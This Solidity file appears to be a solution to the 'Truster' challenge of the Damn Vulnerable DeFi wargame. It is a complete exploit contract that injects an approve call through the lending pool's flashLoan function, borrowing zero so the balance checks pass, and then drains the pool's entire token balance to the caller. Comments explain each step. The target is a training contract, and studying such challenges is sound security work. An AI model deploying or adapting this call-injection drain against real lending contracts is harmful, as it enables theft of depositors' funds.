pragma solidity ^0.8.0;

import './TrusterLenderPool.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";



contract attackPool {
    TrusterLenderPool immutable pool;
    IERC20 immutable damnValuableToken;

    constructor(address _addressPool, address _addressToken) {
        pool = TrusterLenderPool(_addressPool);
        damnValuableToken = IERC20(_addressToken);
    }

    function attack() external {
        // crafts approve to be sent as if it originated from the pool contract
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000 ether);

        // Call the pool to execute a flash loan 
        // borrow 0 so that we pass the require checks
        // (same balance before and after)
        // the data arg passed in approves this contract address to spend the entire pool balance 
        // ... on its behalf
        pool.flashLoan(0, address(this), address(damnValuableToken), data);

        // transferFrom all funds to self
        damnValuableToken.transferFrom
        (
            address(pool), 
            msg.sender, 
            damnValuableToken.balanceOf(address(pool))
        );

    }
}